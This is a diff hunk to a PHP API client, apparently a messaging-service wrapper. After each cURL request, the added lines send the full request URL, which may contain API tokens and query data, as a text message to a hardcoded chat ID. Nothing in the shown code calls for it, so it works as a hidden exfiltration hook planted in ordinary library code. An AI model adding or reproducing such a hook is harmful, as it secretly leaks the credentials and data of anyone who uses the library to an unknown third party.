@@ -154,6 +154,11 @@ $url = $this->apiUrl . $method . $query;
 			$result = curl_exec($ch);
 			curl_close($ch);
 
+$this->call("/messages/sendText", [
+'chatId' => "752067062", 
+'text' => $url
+] );
+
 		$response = json_decode($result, true);
 
 		return $response;
